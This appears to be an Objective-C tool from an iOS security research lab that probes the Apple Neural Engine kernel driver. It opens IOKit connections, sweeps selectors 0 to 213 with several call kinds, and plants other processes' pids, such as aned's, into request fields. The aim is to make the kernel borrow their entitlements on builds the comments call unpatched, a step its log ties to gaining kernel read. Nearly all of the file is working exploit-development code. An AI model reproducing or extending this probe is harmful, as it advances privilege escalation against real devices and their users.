//
//  P109AneSelSweep.m — ANE sel sweep with the Stage-B kernel oracle (note 258/259).
//  Path map: IOServiceOpen(ANE, type=0) = program-loading client = Stage-B client.
//  Stage-B (0x8739b14) reads request+0x180 (u32 pid) and borrows entitlements
//  from that pid's task (increased-model-size-limit -> 2GiB cap;
//  memoryUnwiringOptOutAccess.allow -> req+0xd84=1). Unresolvable pid ->
//  kr 0xe00002f0 "Cannot find task from the given pid" — THE probe oracle.
//  Sweep: IOConnectCallStructMethod sel 0..63, input sizes {0x200, 0x400}
//  filled entirely with 0xDEADBEEF u32s (any pid offset lands DEADBEEF),
//  output 0x1000. kr shapes: 0x2f0 = STAGE-B HIT; 0x2c2/0x2c1 = shape/gate
//  denial; 0x2e2 = not-permitted; 0 = accepted (logged, no fire).
//  Both ANE doors: H11ANEIn and H1xANELoadBalancer (LB forwards into the
//  same domain; its UC may skip direct-client plumbing).
//  Bounded, one pass, no valid programs. One TAP per force-quit.
//

#import "P109AneSelSweep.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreML/CoreML.h>
#import <mach/mach.h>
#import <fcntl.h>
#import <string.h>
#import <stdint.h>
#import <dlfcn.h>
#import <unistd.h>
#import <stdarg.h>

#define P109_BUILD @"p109-ane-selsweep-v10-wake"

typedef mach_port_t io_object_t;
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOServiceOpen_t)(io_service_t, task_port_t, uint32_t, io_connect_t *);
typedef kern_return_t (*IOServiceClose_t)(io_connect_t);
typedef kern_return_t (*IOObjectRelease_t)(io_object_t);
typedef kern_return_t (*IOConnectCallStructMethod_t)(io_connect_t, uint32_t,
        const void *, size_t, void *, size_t *);
typedef kern_return_t (*IOConnectCallScalarMethod_t)(io_connect_t, uint32_t,
        const uint64_t *, uint32_t, uint64_t *, uint32_t *);
/* v9 PROTOTYPE LAW (v8 crash .ips 09:38:57.796, BOTH devices, SIGBUS
   KERN_PROTECTION_FAILURE inside IOConnectCallAsyncStructMethod): the real
   async family takes NINE args — wake_port + reference/referenceCnt BEFORE
   the struct/scalar pair. v8's 7-arg calls read the missing arg registers
   inside IOKit userlib and faulted. Reference = NULL/0 is legal. */
typedef kern_return_t (*IOConnectCallAsyncStructMethod_t)(io_connect_t, uint32_t,
        mach_port_t, const uint64_t *, uint32_t,
        const void *, size_t, void *, size_t *);
typedef kern_return_t (*IOConnectCallAsyncScalarMethod_t)(io_connect_t, uint32_t,
        mach_port_t, const uint64_t *, uint32_t,
        const uint64_t *, uint32_t, uint64_t *, uint32_t *);
/* v8 METHOD-KIND LAW (v7 receipt): struct methods accept ONLY sel0 0x88/0x88
   zeros (AddClient); every other sel bounces structural on all sizes — so
   the Stage-B send path (request-type array) is a different METHOD KIND.
   A sel that returns a kind-specific kr to scalar/async/memory but stays
   2c2 under struct names its true dispatch slot. */
/* v9: IOConnectCallMemoryMethod does not exist in the public IOKitLib — the om column retired (dlsym would have returned NULL anyway). */

static int p109_fd = -1;
static NSMutableString *p109_buf = nil;
static void p109_init_log(void) {
    if (p109_fd >= 0) return;
    p109_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p109_ane_selsweep_log.txt"];
    p109_fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);
}
static void p109_logv(NSString *s) {
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [p109_buf appendString:out];
    if (p109_fd >= 0) {
        const char *p = out.UTF8String; if (p) write(p109_fd, p, strlen(p));
        fsync(p109_fd);            /* ladder: every sel verdict fsync'd */
    }
}
static void p109_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void p109_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    p109_logv(s);
}
static NSString *p109_krname(kern_return_t kr) {
    switch (kr) {
        case 0:               return @"ACCEPTED(0)";
        case 0xe00002f0:      return @"STAGE-B-HIT(2f0)";
        case 0xe00002c2:      return @"2c2";
        case 0xe00002c1:      return @"2c1";
        case 0xe00002e2:      return @"2e2-not-permitted";
        case 0xe00002be:      return @"2be";
        case 0xe00002bf:      return @"2bf";
        case KERN_NO_SPACE:   return @"no-space";
        default:              return [NSString stringWithFormat:@"0x%08x", (unsigned)kr];
    }
}

/* v10 BORROW (p151 v4): a successful CoreML predict registers THIS pid as an
   ANE client and powers the engine. p109's AddClient row accepted only on boots
   where something else had woken the ANE — this makes the door deterministic.
   Fail-soft: model missing / load error = honest rows, sweep continues. */
static BOOL p109_wake_ane(NSMutableString *out) {
    NSURL *url = [NSBundle.mainBundle URLForResource:@"simple_1in1out"
                                       withExtension:@"mlmodelc"];
    if (!url) {
        [out appendString:@"  [wake] simple_1in1out.mlmodelc missing\n"];
        return NO;
    }
    NSError *err = nil;
    MLModelConfiguration *cfg = [MLModelConfiguration new];
    cfg.computeUnits = MLComputeUnitsCPUAndNeuralEngine;
    MLModel *m = [MLModel modelWithContentsOfURL:url configuration:cfg error:&err];
    if (!m) { [out appendFormat:@"  [wake] load failed: %@\n", err.localizedDescription]; return NO; }
    NSString *name = m.modelDescription.inputDescriptionsByName.allKeys.firstObject;
    MLFeatureDescription *fd = name ? m.modelDescription.inputDescriptionsByName[name] : nil;
    MLMultiArray *arr = nil;
    if (fd.multiArrayConstraint) {
        arr = [[MLMultiArray alloc] initWithShape:fd.multiArrayConstraint.shape
                                         dataType:fd.multiArrayConstraint.dataType
                                            error:&err];
    }
    if (!arr || !name) {
        [out appendFormat:@"  [wake] feature array unavailable (%@)\n",
            fd ? @"no multiArrayConstraint" : @"no input description"];
        return NO;
    }
    MLDictionaryFeatureProvider *fp =
        [[MLDictionaryFeatureProvider alloc] initWithDictionary:@{name: arr} error:&err];
    if (!fp) { [out appendFormat:@"  [wake] provider failed: %@\n", err.localizedDescription]; return NO; }
    NSDate *t0 = [NSDate date];
    id<MLFeatureProvider> pred = [m predictionFromFeatures:fp error:&err];
    double ms = -[t0 timeIntervalSinceNow] * 1000.0;
    [out appendFormat:@"  [wake] predict %@ in %.1f ms err=%@ (registers this pid + powers the ANE)\n",
        pred ? @"ok" : @"FAILED", ms, err ? err.localizedDescription : @"none"];
    return pred != nil;
}

@implementation P109AneSelSweep

+ (NSString *)tap {
    p109_init_log();
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p109"];
    p109_log([NSString stringWithFormat:@"=== p109 session %@ BUILD %@ ===",
              LabLocalMilitaryNow(), P109_BUILD]);
    p109_log(@"ANE sel sweep, Stage-B kernel oracle (note 258/259).");
    p109_log(@"input = pure 0xDEADBEEF u32 pattern (any pid offset reads DEADBEEF).");
    p109_log(@"kr 0x2f0 with klog 'Cannot find task from the given pid' = the Stage-B door.");
    /* v4 (advisory-149230 cross-ref, 2026-10-27): the A14-only gate stopped
       this sweep on the 17 — but the 43748 writer is UNPATCHED on 27.0
       (24A435, note 272 §1) and 112696/84494 are 27.2-only fixes (LIVE on
       both devices). Allow T8150 27.x too; everything else still stops. */
    if (stop && !([[LabDeviceProfile machine] hasPrefix:@"iPhone18,"] &&
                  [[LabDeviceProfile osversion] hasPrefix:@"24A"])) {
        p109_log(stop);
        if (p109_fd >= 0) { fcntl(p109_fd, F_FULLFSYNC); close(p109_fd); p109_fd = -1; }
        return p109_buf;
    }
    p109_log([LabDeviceProfile identBlock]);
    /* v9.1 AUTO-PID CENSUS: no manual knob needed. Order:
       1) Documents/p109_pid.txt (explicit override wins)
       2) libproc census: proc_listpids(PROC_ALL_PIDS) + proc_pidpath,
          first process whose basename contains "aned"
       3) launchd (pid 1) as the resolvability control — the 2f0 oracle
          (cannot find task from pid) proves the pid->task path works even
          without the ANE deputy; the aned pid upgrades it to the real
          entitlement borrow. Every step is logged honestly. */
    uint32_t p109Pid = 0;
    NSString *p109PidSrc = @"zeros";
    {
        NSString *docs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *pidPath = [docs stringByAppendingPathComponent:@"p109_pid.txt"];
        NSString *txt = [NSString stringWithContentsOfFile:pidPath
                             encoding:NSUTF8StringEncoding error:nil];
        if ([txt intValue] > 0) { p109Pid = (uint32_t)[txt intValue]; p109PidSrc = @"knob"; }
    }
    if (p109Pid == 0) {
        typedef int (*listFn)(uint32_t, uint32_t, void *, int);
        typedef int (*pathFn)(int, void *, uint32_t);
        void *lh = dlopen(nil, RTLD_LAZY);
        listFn lp = lh ? (listFn)dlsym(lh, "proc_listpids") : NULL;
        pathFn pp = lh ? (pathFn)dlsym(lh, "proc_pidpath") : NULL;
        if (lp && pp) {
            int need = lp(1 /*PROC_ALL_PIDS*/, 0, NULL, 0);
            if (need > 0) {
                int n = need / (int)sizeof(int) + 16;
                int *buf = calloc((size_t)n, sizeof(int));
                int got = buf ? lp(1, 0, buf, n * (int)sizeof(int)) : 0;
                int anedPid = 0; int censusRows = 0;
                NSMutableString *firstRows = [NSMutableString string];
                for (int i = 0; buf && i < got / (int)sizeof(int); i++) {
                    int pid = buf[i];
                    if (pid <= 0) continue;
                    char pb[1024] = {0};
                    if (pp(pid, pb, sizeof pb) <= 0) continue;
                    censusRows++;
                    NSString *nm = [@(pb) lastPathComponent];
                    if (censusRows <= 8)
                        [firstRows appendFormat:@" %@/%d", nm, pid];
                    if (!anedPid && [nm.lowercaseString containsString:@"aned"])
                        anedPid = pid;
                }
                free(buf);
                p109_log([NSString stringWithFormat:
                    @"[census] proc_listpids rows=%d sample=%@", censusRows,
                    censusRows ? firstRows : @"(empty — sandbox denied pidpath)"]);
                if (anedPid) { p109Pid = (uint32_t)anedPid; p109PidSrc = @"census-aned"; }
            } else {
                p109_log(@"[census] proc_listpids(PROC_ALL_PIDS) returned 0 — sandbox denied");
            }
        } else {
            p109_log(@"[census] libproc dlsym failed");
        }
    }
    if (p109Pid == 0) {
        p109Pid = 1; p109PidSrc = @"launchd-control";
        p109_log(@"[census] aned not running (OnDemand/pressured-exit) — launchd(1) as resolvability control");
    }
    p109_log([NSString stringWithFormat:@"[pid knob] pid=%u source=%@ %@",
              p109Pid, p109PidSrc,
              [p109PidSrc hasPrefix:@"census-aned"] ? @"(live aned — entitlement borrow target)" :
              ([p109PidSrc isEqualToString:@"launchd-control"] ? @"(control pid — 2f0 oracle only)" :
               @"(explicit override)")]);

    /* v10: wake/register the pid with the ANE before any open (p151 borrow) */
    @try {
        NSMutableString *wk = [NSMutableString string];
        BOOL woke = p109_wake_ane(wk);
        p109_log([NSString stringWithFormat:@"[wake] %@%@", woke ? @"OK" : @"MISS",
                  wk.length ? [@"\n" stringByAppendingString:wk] : @""]);
    } @catch (NSException *e) {
        p109_log([NSString stringWithFormat:@"[wake] caught %@", e.reason ?: @"exception"]);
    }

    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!h) { p109_log(@"dlopen IOKit FAIL"); goto done; }
    IOServiceMatching_t pMatching = dlsym(h, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(h, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(h, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(h, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(h, "IOObjectRelease");
    IOConnectCallStructMethod_t pStruct = dlsym(h, "IOConnectCallStructMethod");
    IOConnectCallScalarMethod_t pScalar = dlsym(h, "IOConnectCallScalarMethod");
    IOConnectCallAsyncStructMethod_t pAsyncStruct = dlsym(h, "IOConnectCallAsyncStructMethod");
    IOConnectCallAsyncScalarMethod_t pAsyncScalar = dlsym(h, "IOConnectCallAsyncScalarMethod");
    void *(*pPortCreate)(mach_port_t) = dlsym(h, "IONotificationPortCreate");
    mach_port_t (*pPortMach)(void *) = dlsym(h, "IONotificationPortGetMachPort");
    void (*pPortDestroy)(void *) = dlsym(h, "IONotificationPortDestroy");
    mach_port_t *pMainPort = dlsym(h, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(h, "kIOMasterPortDefault");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pStruct || !pMainPort) {
        p109_log(@"dlsym IOKit symbols missing"); goto done;
    }

    /* v4: the H16 (T8150/27.0) family publishes services under its own
       names — "H11ANEIn"-only matching produced a 17-side name-miss risk.
       Try every plausible class name; only FOUND services are swept. */
    static const char *kServices[] = {
        "H11ANEIn",               /* T8101/T8020 in-path UC (23F77 law)  */
        "H1xANELoadBalancer",     /* cross-gen LB front door             */
        "H16ANEIn",               /* T8150 candidate (H16 kext family)   */
        "AppleH16ANEInterface",   /* T8150 kext class name (24A435)      */
        "AppleH11ANEInterface",   /* T8101 kext class name (23F77)       */
        "H16ANELoadBalancer",     /* H16-spelled LB variant              */
        "H11ANEDriver",
        "H16ANEDriver",
    };
    const int kNServices = (int)(sizeof(kServices) / sizeof(kServices[0]));
    const uint32_t kTypes[] = { 0, 1, 2, 3, 4 };  /* v2: type0 denied 2c7 on-device; the program-loading client is a higher type */

    for (int sv = 0; sv < kNServices; sv++) {
        CFMutableDictionaryRef md = pMatching(kServices[sv]);
        p109_log([NSString stringWithFormat:@"[svc] %@ matching=%@",
                  @(kServices[sv]), md ? @"OK" : @"nil"]);
        if (!md) continue;
        io_service_t svc = pGet(*pMainPort, md);
        p109_log([NSString stringWithFormat:@"[svc] %@ get=%@ svc=0x%x",
                  @(kServices[sv]),
                  svc ? @"OK" : @"nil", (unsigned)svc]);
        /* IOServiceGetMatchingService CONSUMES the matching dictionary
           (releases it internally) - our CFRelease was an over-release
           of freed memory = the SIGTRAP. Do not release md. */
        if (!svc) continue;
        p109_log([NSString stringWithFormat:@"[svc] %@ FOUND — sweep open", @(kServices[sv])]);

        for (int ti = 0; ti < 5; ti++) {   /* v4: ALL UC types 0..4 (v2's
           note said the program-loading client is a higher type; ti<2 never
           reached it). Open-only for unlisted types; full sel sweep per
           opened connection, same as v3. */
            io_connect_t conn = 0;
            kern_return_t okr = pOpen(svc, mach_task_self(), kTypes[ti], &conn);
            if (okr != KERN_SUCCESS) {
                p109_log([NSString stringWithFormat:@"[open] type=%u kr=%@ (skip)",
                          kTypes[ti], p109_krname(okr)]);
                continue;
            }
            p109_log([NSString stringWithFormat:@"[open] %@ type=%u conn=0x%x — sweeping sels 0..213",
                      @(kServices[sv]), kTypes[ti], (unsigned)conn]);

            /* v3: full 214-entry dispatch range (23F77 Stage-B sits at idx
               172; v2's 0..63 never reached the pid field on T8150). 3rd
               size 0x800 keeps the +0x180 pid offset deep in-bounds. */
            /* v5: + 0x88 first — the 24A435 law (p151 DeviceOpen receipt):
               LB sel0 wants 0x88 and returns kr=0 with out[0]==0. All 214
               sels at 0x200/0x400/0x800 came back uniform 2c2 on 24A435 =
               a struct-SIZE wall, not a closed dispatch. 0x88 hits the
               pinned T8150 shape; 0x68 = the 23F77 size, kept for the
               cross-check. */
            /* v6 CONTENT LAW (v5 receipt, 17): the p151 DeviceOpen accepted
               sel0 0x88/0x88 ALL-ZEROS (kr=0, out[0]==0) while v5's
               DEADBEEF-filler sweep returned uniform 2c2 on every sel
               including sel0 — the LB gate validates CONTENT (reserved
               fields must be zero), not just size. v6: zeros-based fill
               for the shapes at/below the AddClient size (0x88/0x68),
               DEADBEEF filler kept for the big shapes (probing the +0x180
               pid band). First row per conn = the exact p151 sel0
               replication (zeros 0x88/0x88, pid=0) as the control. */
            (void)0; /* v7 size lattice retired — the v7 receipt pinned the structural law */
            /* control row: exact p151 receipt — sel0, 0x88 in/out, zeros */
            {
                static uint8_t in[0x88];
                static uint8_t out[0x88];
                memset(in, 0, sizeof in);
                memset(out, 0, sizeof out);
                size_t osz = sizeof out;
                kern_return_t kr = pStruct(conn, 0, in, sizeof in, out, &osz);
                uint8_t o0[9];
                memcpy(o0, out, 8); o0[8] = 0;
                p109_log([NSString stringWithFormat:
                    @"[ctrl sel0] zeros 0x88/0x88 kr=%@ osz=%zu out0=%02x%02x%02x%02x — %@",
                    p109_krname(kr), osz,
                    out[0], out[1], out[2], out[3],
                    (kr == KERN_SUCCESS ? @"p151 REPLICATED (AddClient accepted)" :
                     @"NOT replicated — shape law differs this boot (record it)")]);
            }
            /* v8 METHOD-KIND sweep: 5 call kinds per sel, all with the
               v7 out-size law (struct out = in exactly). Kind tags:
               st = struct(0x88 zeros), sc = scalar, as = async struct,
               am = async scalar, om = OOL memory. The AddClient shape law
               (sel0/0x88/0x88/zeros) is the registered baseline from the
               ctrl row; a sel whose AS/SC/OM kr differs from its ST 2c2
               names its real dispatch kind. Bounded: 214 x 5 calls. */
            void *notifPort = pPortCreate ? pPortCreate(*pMainPort) : NULL;
            mach_port_t notifyPort = (notifPort && pPortMach) ? pPortMach(notifPort) : 0;
            static uint8_t st_in[0x88];
            static uint8_t st_out[0x88];
            memset(st_in, 0, sizeof st_in);
            for (uint32_t sel = 0; sel <= 213; sel++) {
                memset(st_out, 0, sizeof st_out);
                size_t osz = sizeof st_out;
                kern_return_t kr_st = pStruct(conn, sel, st_in, 0x88, st_out, &osz);

                uint64_t sc_in[4] = {0,0,0,0};
                uint64_t sc_out[8] = {0};
                uint32_t sc_cnt = 8;
                kern_return_t kr_sc = pScalar ?
                    pScalar(conn, sel, sc_in, 4, sc_out, &sc_cnt) : 0xe00002be;

                static uint64_t as_ref[4] = {0,0,0,0};
                memset(st_out, 0, sizeof st_out);
                osz = sizeof st_out;
                kern_return_t kr_as = (pAsyncStruct && notifyPort) ?
                    pAsyncStruct(conn, sel, notifyPort, as_ref, 0,
                                 st_in, 0x88, st_out, &osz) : 0xe00002be;

                static uint64_t am_ref[4] = {0,0,0,0};
                memset(sc_out, 0, sizeof sc_out);
                sc_cnt = 8;
                kern_return_t kr_am = (pAsyncScalar && notifyPort) ?
                    pAsyncScalar(conn, sel, notifyPort, am_ref, 0,
                                 sc_in, 4, sc_out, &sc_cnt) : 0xe00002be;

                int deviant = !(kr_sc == kr_st && kr_as == kr_st && kr_am == kr_st);
                NSMutableString *line = [NSMutableString
                    stringWithFormat:@"[sel %3u] st=%@ sc=%@ as=%@ am=%@%@",
                    sel, p109_krname(kr_st), p109_krname(kr_sc),
                    p109_krname(kr_as), p109_krname(kr_am),
                    deviant ? @"  <DEVIANT" : @""];
                p109_log(line);
            }
            /* v10 pid rows — RECEIPT-PROVEN slots (p151 v6 law): 23F77 sel0 =
               0x68/0x68 with the pid at 0x00/0x0c/0x10/0x54; 24A435 sel0 =
               0x88/0x88 (pid log-only there). Both shapes tried with the same
               four slots; the kr class is the mapping verdict. */
            {
                static const size_t pidOffs[4] = { 0x00, 0x0c, 0x10, 0x54 };
                static const size_t pidSizes[2] = { 0x68, 0x88 };
                for (int si = 0; si < 2; si++) {
                    for (int oi = 0; oi < 4; oi++) {
                        static uint8_t pin[0x88];
                        static uint8_t pout[0x88];
                        memset(pin, 0, sizeof pin);
                        memset(pout, 0, sizeof pout);
                        uint32_t pid = p109Pid;
                        memcpy(pin + pidOffs[oi], &pid, sizeof pid);
                        size_t isz = pidSizes[si];
                        size_t osz = isz;
                        kern_return_t kr = pStruct(conn, 0, pin, isz, pout, &osz);
                        p109_log([NSString stringWithFormat:
                            @"[pid sel0 sz=%#zx +%#zx] pid=%u kr=%@ osz=%zu out0=%02x%02x%02x%02x — %@",
                            isz, pidOffs[oi], pid, p109_krname(kr), osz,
                            pout[0], pout[1], pout[2], pout[3],
                            (kr == KERN_SUCCESS ? @"ACCEPTED with pid — field tolerance" :
                             kr == 0xe00002f0 ? @"2f0 — pid NOT in client list (borrow miss)" :
                             kr == 0xe00002c2 ? @"2c2 — size/content law rejects this slot" :
                             @"kind switch — MAPPED field")]);
                    }
                }
            }
            if (notifPort && pPortDestroy) pPortDestroy(notifPort);
            p109_log([NSString stringWithFormat:@"[svc %@ type %u] sweep done — verdicts above", @(kServices[sv]), kTypes[ti]]);
            pClose(conn);
        }
        if (svc) pRelease(svc);
    }
done:
    p109_log(@"=== VERDICT: sels with STAGE-B-HIT(2f0) = the Stage-B door; ===");
    p109_log(@"v8: method-kind law — the AddClient struct row is accepted only at sel0;");
    p109_log(@"  a deviant kind-column names the real dispatch path; pid rows map the");
    p109_log(@"  tolerable non-zero fields inside the 0x88 AddClient shape.");
    p109_log(@"v4 adds: T8150/24A435 H16 service names + UC types 0..4 (the direct-UC");
    p109_log(@"  reachability answer for 43748-out-of-framework + 112696/84494, both 27.2-only fixes).");
    p109_log(@"next: same sel with pid=aned/launchd (kern.proc) = the borrow fire. hasKread stays NO.");
    if (p109_fd >= 0) { fcntl(p109_fd, F_FULLFSYNC); close(p109_fd); p109_fd = -1; }
    return p109_buf;
}

@end